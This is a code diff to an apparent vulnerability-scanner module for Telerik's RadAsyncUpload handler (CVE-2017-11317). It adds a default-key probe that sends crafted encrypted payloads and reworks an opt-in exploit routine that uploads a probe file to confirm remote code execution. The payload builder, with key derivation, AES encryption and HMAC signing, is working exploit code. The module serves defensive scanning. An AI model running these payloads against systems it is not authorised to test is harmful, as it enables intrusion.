@@ -256,6 +256,17 @@ class telerik(BaseModule):
     # RAU (CVE-2017-11317)
     # -----------------------------------------------------------------------
 
+    # (KDF mode, HMAC on/off) combinations to try in the safe default-keys probe.
+    # Covers pre-2017 (PBKDF1_MS + no HMAC), the PBKDF1_MS + HMAC window (2017.1.118 - 2018.1.117),
+    # and post-PBKDF2 (2018.2+). Any combo hitting the "Could not load file or assembly" signal
+    # proves the target accepts default keys without triggering a file upload.
+    _RAU_PROBE_VARIANTS = (
+        ("PBKDF1_MS", False),
+        ("PBKDF1_MS", True),
+        ("PBKDF2", True),
+    )
+    _RAU_FAKE_VERSION = "9999.9.999"
+
     async def _probe_rau(self, base_url, event):
         webresource = "Telerik.Web.UI.WebResource.axd?type=rau"
         url = f"{base_url}{webresource}"
@@ -264,13 +275,11 @@ class telerik(BaseModule):
             return
         self.verbose(f"Detected Telerik RAU handler at {url}")
 
-        version, verbose_errors = await self._rau_version_fingerprint(url)
-
         await self.emit_event(
             {
                 "host": str(event.host),
                 "url": url,
-                "description": f"Verbose Errors Enabled: [{verbose_errors}] Version Guess: [{version}]",
+                "description": "Telerik RAU handler detected",
                 "name": "Telerik RAU Handler",
                 "severity": "INFO",
                 "confidence": "HIGH",
@@ -280,29 +289,62 @@ class telerik(BaseModule):
             context=f"{{module}} scanned {base_url} and identified {{event.type}}: Telerik RAU Handler",
         )
 
+        # Safe probe: fake-version payload with default keys. Assembly load fails before file write,
+        # so a hit proves the crypto works without persisting anything on the target.
+        await self._probe_rau_default_keys(url, event)
+
         if self.config.get("exploit_rau") and base_url not in self._rau_confirmed:
             self._rau_confirmed.add(base_url)
             await self._confirm_rau_knownkey(url, event, base_url)
 
-    async def _rau_version_fingerprint(self, url):
-        """Send a payload built with default keys and read the crypto-error banner in the response."""
-        payload = self._build_rau_multipart("2014.3.1024", RAU_DEFAULT_ENC_KEY, RAU_DEFAULT_HASH_KEY)
-        response = await self.helpers.request(url, method="POST", files=payload)
-        if not response:
-            return "unknown", False
-        text = response.text
-        if "Exception Details: " not in text:
-            return "unknown", False
-        if "Telerik.Web.UI.CryptoExceptionThrower.ThrowGenericCryptoException" in text:
-            return "Post-2020 (Encrypt-Then-Mac Enabled, with Generic Crypto Failure Message)", True
-        if "Padding is invalid and cannot be removed" in text:
-            return "<= 2019 (Either Pre-2017 (vulnerable), or 2017-2019 w/ Encrypt-Then-Mac)", True
-        return "unknown", True
+    async def _probe_rau_default_keys(self, url, event):
+        """
+        Send fake-version payloads with default keys across each (KDF, HMAC) variant.
+        Response `Could not load file or assembly` = crypto succeeded, .NET failed to load
+        the bogus assembly type -> default keys accepted, no file uploaded.
+        """
+        for kdf_mode, include_hmac in self._RAU_PROBE_VARIANTS:
+            payload = self._build_rau_multipart(
+                self._RAU_FAKE_VERSION, RAU_DEFAULT_ENC_KEY, RAU_DEFAULT_HASH_KEY, kdf_mode, include_hmac
+            )
+            response = await self.helpers.request(url, method="POST", files=payload)
+            if not response or "Could not load file or assembly" not in response.text:
+                continue
+            self.debug(f"RAU default keys accepted (KDF={kdf_mode}, HMAC={include_hmac})")
+            await self.emit_event(
+                {
+                    "host": str(event.host),
+                    "url": url,
+                    "description": (
+                        f"Telerik RAU accepts default keys (KDF={kdf_mode}, HMAC={include_hmac}). "
+                        "RCE is achievable once the exact installed Telerik version is identified; "
+                        "no file was uploaded by this probe."
+                    ),
+                    "name": "Telerik RAU Default Keys Accepted (CVE-2017-11317)",
+                    "severity": "HIGH",
+                    "confidence": "HIGH",
+                },
+                "FINDING",
+                event,
+                context=f"{{module}} confirmed default RAU keys at {url} without uploading",
+            )
+            return
 
     async def _confirm_rau_knownkey(self, url, event, base_url):
-        """Spray default RAU keys across candidate versions. `{"fileInfo":` in the response = RCE."""
+        """
+        Version-identification + exploit. Iterate real Telerik versions with default keys;
+        the one producing `{"fileInfo":` also uploads the benign 1-byte probe file to the
+        target's C:\\Windows\\Temp\\. Only runs when exploit_rau=True.
+        """
         for version in self.telerik_versions:
-            payload = self._build_rau_multipart(version, RAU_DEFAULT_ENC_KEY, RAU_DEFAULT_HASH_KEY)
+            if int(version[:4]) <= 2017 or version == "2018.1.117":
+                kdf_mode = "PBKDF1_MS"
+            else:
+                kdf_mode = "PBKDF2"
+            include_hmac = int(version[:4]) >= 2017
+            payload = self._build_rau_multipart(
+                version, RAU_DEFAULT_ENC_KEY, RAU_DEFAULT_HASH_KEY, kdf_mode, include_hmac
+            )
             response = await self.helpers.request(url, method="POST", files=payload)
             if response and '"fileInfo":' in response.text:
                 self.debug(f"Confirmed RAU RCE (version: {version})")
@@ -329,23 +371,23 @@ class telerik(BaseModule):
         cipher = AES.new(key, AES.MODE_CBC, iv)
         return base64.b64encode(cipher.encrypt(padded.encode())).decode()
 
-    def _rau_sign(self, ciphertext_b64, version, hashkey):
-        if int(version[:4]) < 2017:
+    def _rau_sign(self, ciphertext_b64, hash_key, include_hmac):
+        if not include_hmac:
             return ciphertext_b64
         from Crypto.Hash import HMAC, SHA256
 
-        h = HMAC.new(key=hashkey.encode(), msg=ciphertext_b64.encode(), digestmod=SHA256.new())
+        h = HMAC.new(key=hash_key.encode(), msg=ciphertext_b64.encode(), digestmod=SHA256.new())
         return f"{ciphertext_b64}{base64.b64encode(h.digest()).decode()}"
 
-    def _build_rau_multipart(self, version, enc_key, hash_key):
-        """Build the httpx `files=` dict for a RAU exploit payload matching `version` + keys."""
-        if int(version[:4]) <= 2017 or version == "2018.1.117":
+    def _build_rau_multipart(self, assembly_version, enc_key, hash_key, kdf_mode, include_hmac):
+        """Build the httpx `files=` dict for a RAU payload with explicit KDF + HMAC choices."""
+        if kdf_mode == "PBKDF1_MS":
             key, iv = self._enc.telerik_derivekeys_PBKDF1_MS(enc_key)
         else:
             key, iv = self._enc.telerik_derivekeys_PBKDF2(enc_key)
 
-        enc_target_folder = self._rau_sign(self._rau_encrypt("", key, iv), version, hash_key)
-        enc_temp_folder = self._rau_sign(self._rau_encrypt("C:\\Windows\\Temp\\", key, iv), version, hash_key)
+        enc_target_folder = self._rau_sign(self._rau_encrypt("", key, iv), hash_key, include_hmac)
+        enc_temp_folder = self._rau_sign(self._rau_encrypt("C:\\Windows\\Temp\\", key, iv), hash_key, include_hmac)
         rau_post_data_json = (
             f'{{"TargetFolder":"{enc_target_folder}",'
             f'"TempTargetFolder":"{enc_temp_folder}",'
@@ -356,7 +398,7 @@ class telerik(BaseModule):
             '"UseApplicationPoolImpersonation":false}'
         )
         assembly_type = (
-            f"Telerik.Web.UI.AsyncUploadConfiguration, Telerik.Web.UI, Version={version}, "
+            f"Telerik.Web.UI.AsyncUploadConfiguration, Telerik.Web.UI, Version={assembly_version}, "
             "Culture=neutral, PublicKeyToken=121fae78165ba3d4"
         )
         rau_post_data = f"{self._rau_encrypt(rau_post_data_json, key, iv)}&{self._rau_encrypt(assembly_type, key, iv)}"
